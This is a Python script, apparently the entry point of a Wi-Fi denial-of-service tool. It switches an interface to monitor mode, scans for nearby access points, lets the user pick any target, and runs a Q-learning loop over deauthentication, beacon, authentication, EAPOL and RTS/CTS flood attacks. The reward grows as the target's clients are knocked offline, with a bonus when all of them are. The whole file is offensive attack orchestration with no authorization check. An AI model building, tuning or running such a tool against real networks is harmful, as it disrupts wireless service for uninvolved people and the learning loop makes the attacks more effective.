#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
main.py - Main script for launching the DoS utility with ML (Q-Learning).
1) Switches the interface to monitor mode.
2) Runs airodump-ng scan to select a target BSSID.
3) Executes a loop (EPISODES=15) with decaying epsilon.
4) In each step:
   - Selects an action (combo) and launches attacks.
   - Captures a pcap for analyzing EAPOL/handshake.
   - Measures station_count with baseline filtering.
   - Measures current target performance via TCP connections.
   - Computes reward: if effective_count (measured client count) equals 0, a bonus is given.
5) Outputs metrics per episode.
6) Optionally resets the AP/clients.
"""

import os
import sys
import time
import subprocess
import signal
import random
import csv
import re

from attacks import (
    DeauthFlood, BeaconFlood, AuthDOS,
    DeauthFloodMDK, EAPOLStartFlood,
    WIDSConfusion, RTSCTSFlood, stop_all_attacks
)
from traffic_analyzer import TrafficAnalyzer
from ml_core import QLearningAgent


def monitor_mode_setup():
    print("[INFO] Checking for processes to kill...")
    os.system("sudo airmon-ng check kill")
    interfaces = subprocess.getoutput("sudo airmon-ng").split("\n")
    print("\n[INFO] Available Interfaces for Monitor Mode:")
    for line in interfaces:
        print(line)
    interface = input("\nEnter interface for monitor mode (e.g. wlan0): ").strip()
    if not interface:
        print("[ERROR] No interface provided.")
        sys.exit(1)
    os.system(f"sudo airmon-ng start {interface}")
    new_interfaces = subprocess.getoutput("iwconfig").split("\n")
    monitor_interface = interface
    for line in new_interfaces:
        if "Mode:Monitor" in line:
            monitor_interface = line.split()[0]
            break
    print(f"[INFO] {interface} switched to monitor mode as {monitor_interface}")
    return monitor_interface


def get_network_list(monitor_interface):
    print("[INFO] Running airodump-ng for 10 seconds to find APs...")
    os.system("sudo rm -f /tmp/airodump-01.csv /tmp/airodump-01.kismet* /tmp/airodump-01.log.csv")
    process = subprocess.Popen(
        f"sudo airodump-ng {monitor_interface} --write /tmp/airodump --output-format csv --write-interval 1",
        shell=True, preexec_fn=os.setsid,
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    for _ in range(10):
        sys.stdout.write(".")
        sys.stdout.flush()
        time.sleep(1)
    print("\n[INFO] Stopping airodump-ng...")
    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
    time.sleep(2)
    csv_file = "/tmp/airodump-01.csv"
    if not os.path.exists(csv_file):
        print("[ERROR] No airodump output found.")
        return None, None
    networks = []
    with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            row = line.strip().split(",")
            if len(row) > 13 and row[0].count(":") == 5:
                bssid = row[0].strip()
                channel = row[3].strip()
                essid = row[13].strip()
                networks.append((bssid, channel, essid))
    if not networks:
        print("[INFO] No networks found. Exiting.")
        return None, None
    unique = {}
    for (bssid, ch, essid) in networks:
        unique[bssid] = (ch, essid)
    print("\n[INFO] Networks found:")
    print("Num | BSSID              | Channel | ESSID")
    print("-------------------------------------------")
    i = 1
    for b in unique:
        (c, e) = unique[b]
        print(f"{i:>3} | {b:<18} | {c:<7} | {e}")
        i += 1
    while True:
        choice = input("\nSelect target network number: ").strip()
        if not choice.isdigit():
            print("[ERROR] Invalid choice. Please enter a number.")
            continue
        c = int(choice)
        if c < 1 or c > len(unique):
            print("[ERROR] Choice out of range.")
            continue
        break
    bssid_chosen = list(unique.keys())[c - 1]
    channel_chosen = unique[bssid_chosen][0]
    print(f"[INFO] Chosen BSSID={bssid_chosen}, Channel={channel_chosen}")
    return bssid_chosen, channel_chosen


def is_valid_mac(mac):
    return re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', mac.strip()) is not None


def parse_station_count(bssid, monitor_if, channel, capture_time=5, prefix="/tmp/airodump-stations", baseline=None):
    import csv
    os.system(f"sudo rm -f {prefix}-01.csv {prefix}-01.kismet* {prefix}-01.log.csv")
    cmd = (
        f"sudo airodump-ng --bssid {bssid} --channel {channel} "
        f"--write {prefix} --output-format csv --write-interval 1 {monitor_if}"
    )
    process = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(capture_time)
    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
    time.sleep(1)
    csv_path = f"{prefix}-01.csv"
    if not os.path.exists(csv_path):
        return (0, set()) if baseline is None else 0
    station_macs = set()
    with open(csv_path, newline='', encoding="utf-8", errors="ignore") as csvfile:
        rows = list(csv.reader(csvfile))
        header_index = None
        for idx, row in enumerate(rows):
            if row and row[0].strip() == "Station MAC":
                header_index = idx
                break
        if header_index is None:
            return (0, set()) if baseline is None else 0
        for row in rows[header_index + 1:]:
            if not row or len(row) < 6:
                break
            station_mac = row[0].strip()
            associated_bssid = row[5].strip().lower()
            if not is_valid_mac(station_mac):
                continue
            if associated_bssid == bssid.lower():
                station_macs.add(station_mac)
    if baseline is not None:
        filtered = station_macs.intersection(baseline)
        return len(filtered)
    else:
        return len(station_macs), station_macs


def main_loop(monitor_if, bssid, channel):
    """
    Main Q-Learning loop with EPISODES=15.
    If the measured station_count falls below half of the baseline, the effective_count is considered 0,
    granting a bonus of +5.0 for disconnecting clients.
    """
    attack_classes = [
        DeauthFlood,
        BeaconFlood,
        AuthDOS,
        DeauthFloodMDK,
        EAPOLStartFlood,
        WIDSConfusion,
        RTSCTSFlood
    ]
    agent = QLearningAgent(
        attack_classes=attack_classes,
        pps_levels=[1, 2],
        threads_levels=[1, 2],
        power_levels=[1],
        duration_levels=[1, 2],
        max_combo=2,
        alpha=0.1,
        gamma=0.9,
        epsilon_start=0.9,
        epsilon_end=0.1,
        epsilon_decay=0.98
    )
    os.system(f"sudo iwconfig {monitor_if} channel {channel}")
    time.sleep(1)
    EPISODES = 15
    STEPS_PER_EPISODE = 3

    # Obtain the baseline set of MAC addresses
    base_count, baseline_macs = parse_station_count(bssid, monitor_if, channel)
    print(f"[INFO] Initial station_count = {base_count}")
    print(f"[INFO] Baseline MAC addresses: {baseline_macs}")

    # Initialize TrafficAnalyzer for active target performance measurement
    analyzer = TrafficAnalyzer(pcap_file="/tmp/capture.pcap", bssid=bssid)
    analyzer.establish_baseline(duration=2)

    offline_duration = 0
    current_state = (base_count, 0, offline_duration)

    for episode in range(1, EPISODES + 1):
        print(f"\n===== EPISODE {episode}/{EPISODES} =====")
        for step in range(1, STEPS_PER_EPISODE + 1):
            action_combo = agent.select_action(current_state)
            threads = []
            for slot in action_combo:
                attack_obj, pps_lv, thr_lv, pow_lv, dur_lv = slot
                thr = attack_obj.run(
                    pps_level=pps_lv,
                    threads_level=thr_lv,
                    power_level=pow_lv,
                    duration_level=dur_lv,
                    bssid=bssid,
                    interface=monitor_if,
                    channel=channel
                )
                threads.extend(thr)
            time.sleep(3)
            stop_all_attacks()
            for t in threads:
                t.join()
            # Capture pcap for analyzing EAPOL/handshake
            capture_file = "/tmp/capture.pcap"
            os.system(f"sudo rm -f {capture_file}")
            os.system(f"sudo timeout 2 tcpdump -i {monitor_if} -w {capture_file} >/dev/null 2>&1")
            analyzer.pcap_file = capture_file
            analyzer.analyze_offline()
            features = analyzer.get_features()
            # Measure station_count via airodump-ng with baseline filtering
            new_count = parse_station_count(bssid, monitor_if, channel, baseline=baseline_macs)
            baseline_count = len(baseline_macs)
            effective_count = new_count if new_count >= (baseline_count / 2) else 0

            # Actively measure the target performance via TCP connections
            current_perf = analyzer.get_current_performance(duration=1)
            # Reward is computed as the difference between the baseline and current performance
            reward = (analyzer.baseline - current_perf)
            # Add bonus for reduction in the number of clients
            old_count = current_state[0]
            if effective_count < old_count and effective_count > 0:
                reward += 0.5 * (old_count - effective_count)
            if effective_count == 0:
                if old_count > 0:
                    reward += 5.0
                    offline_duration = 1
                else:
                    reward += 1.0
                    offline_duration += 1
            else:
                offline_duration = 0

            success_label = 1 if reward > 1.0 else 0
            true_label = 1
            agent.record_outcome(success_label, true_label)
            next_state = (effective_count, features["handshake_detected"], offline_duration)
            agent.update_q(current_state, action_combo, reward, next_state)
            print(f"[STEP] Episode={episode}, Step={step}, station_count={new_count} (effective: {effective_count}), offline_duration={offline_duration}, reward={reward:.2f}")
            for i, slot in enumerate(action_combo, start=1):
                atk, pps_lv, thr_lv, pow_lv, dur_lv = slot
                print(f"   combo#{i}: {atk.name}, pps={pps_lv}, thr={thr_lv}, power={pow_lv}, dur={dur_lv}")
            current_state = next_state
            time.sleep(2)
        acc, prec, rec, f1 = agent.compute_metrics()
        print(f"[METRICS] Episode={episode}, Acc={acc:.2f}, Prec={prec:.2f}, Recall={rec:.2f}, F1={f1:.2f}")
        agent.decay_epsilon()
    print("[INFO] Q-Learning complete.")
    best_action = agent.get_best_action(current_state)
    if best_action:
        print(f"[INFO] Best combo at final state {current_state}:")
        for i, slot in enumerate(best_action, start=1):
            atk, pps_lv, thr_lv, pow_lv, dur_lv = slot
            print(f"   combo#{i}: {atk.name}, pps={pps_lv}, thr={thr_lv}, power={pow_lv}, dur={dur_lv}")
    else:
        print("[INFO] No best combo found yet.")


def main():
    monitor_if = monitor_mode_setup()
    if not monitor_if:
        print("[ERROR] No monitor interface available.")
        sys.exit(1)
    bssid, channel = get_network_list(monitor_if)
    if not bssid or not channel:
        print("[ERROR] No BSSID or channel selected.")
        sys.exit(1)
    main_loop(monitor_if, bssid, channel)


if __name__ == "__main__":
    main()
